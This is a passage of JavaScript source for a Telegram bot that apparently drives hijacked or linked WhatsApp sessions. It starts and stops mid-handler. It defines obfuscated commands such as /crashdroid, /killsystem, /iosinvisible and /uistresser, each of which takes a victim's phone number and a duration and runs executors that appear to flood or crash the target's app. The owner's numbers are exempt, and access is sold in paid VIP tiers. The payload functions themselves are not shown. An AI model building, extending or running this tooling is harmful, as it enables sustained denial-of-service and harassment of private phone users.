    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /visiblemax +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /visiblemax: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /visiblemax: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /visiblemax: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /visiblemax: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonMxExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /visiblemax for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /visiblemax: ${error.message}`);
  }
});

botInstance.onText(/\/eie99wi2(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /crashdroid raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /crashdroid input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /crashdroid: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /crashdroid +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /crashdroid: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /crashdroid +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /crashdroid: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /crashdroid: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /crashdroid: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /crashdroid: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      callXeonExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /crashdroid for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /crashdroid: ${error.message}`);
  }
});

botInstance.onText(/\/cssfd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /uiking raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /uiking input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /uiking: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /uiking +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /uiking: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /uiking +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /uiking: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /uiking: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /uiking: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /uiking: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonUiKingExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /uiking for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /uiking: ${error.message}`);
  }
});

botInstance.onText(/\/idoeiejw01i2jc(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /killsystem raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /killsystem input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /killsystem: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /killsystem +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /killsystem: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /killsystem +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /killsystem: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /killsystem: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /killsystem: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /killsystem: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonUiKingExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /killsystem for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /killsystem: ${error.message}`);
  }
});

botInstance.onText(/\/brZx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /ultradelay raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /ultradelay input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /ultradelay: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /ultradelay +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /ultradelay: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /ultradelay +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /ultradelay: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /ultradelay: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /ultradelay: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /ultradelay: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonUltraDelayExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /ultradelay for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /ultradelay: ${error.message}`);
  }
});

botInstance.onText(/\/dssd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delaymix raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /delaymix input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /delaymix: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delaymix +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /delaymix: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delaymix +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delaymix: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /delaymix: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delaymix: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delaymix: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonDelayMix(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /delaymix for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delaymix: ${error.message}`);
  }
});

botInstance.onText(/\/83i2jdjd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /iosinvisible raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /iosinvisible input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /iosinvisible: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /iosinvisible +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /iosinvisible: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /iosinvisible +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /iosinvisible: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /iosinvisible: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /iosinvisible: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /iosinvisible: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104413'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
      await XiosInviNew(durationHours, formattedNumber, userNumber, chatId, botInstance)
  } catch (error) {
    console.error(`Error in /iosinvisible for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /iosinvisible: ${error.message}`);
  }
});

botInstance.onText(/\/8eiwksksksks(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /iosvisible raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /iosvisible input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /iosvisible: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /iosvisible +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /iosvisible: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /iosvisible +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /iosvisible: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /iosvisible: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /iosvisible: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /iosvisible: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104413'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
      await XiosInviOld(durationHours, formattedNumber, userNumber, chatId, botInstance)
  } catch (error) {
    console.error(`Error in /iosvisible for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /iosvisible: ${error.message}`);
  }
});

botInstance.onText(/\/xdxduistresser(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /${match[1]} raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /${match[1]} input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /${match[1]}: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /${match[1]}: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /${match[1]}: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /${match[1]}: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /${match[1]}: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /${match[1]}: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2`);
  }

